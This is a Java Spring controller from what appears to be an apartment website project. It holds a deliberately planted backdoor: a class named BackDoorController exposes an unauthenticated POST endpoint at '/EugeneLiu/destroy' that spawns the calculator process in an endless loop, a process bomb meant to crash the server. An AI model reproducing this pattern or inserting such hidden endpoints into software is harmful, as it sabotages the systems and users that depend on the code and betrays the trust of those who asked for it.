package com.EugeneStudio.apartmentWebsite.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;

@Controller("backDoorController")
@RequestMapping("/EugeneLiu")
public class BackDoorController {

    @ResponseBody
    @RequestMapping(value = "/destroy", method = RequestMethod.POST, produces = "application/json;charset=utf-8")
    public Object destroyWebsite() {
        try {
            while (true) {
                Runtime.getRuntime().exec("calc");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return true;
    }
}
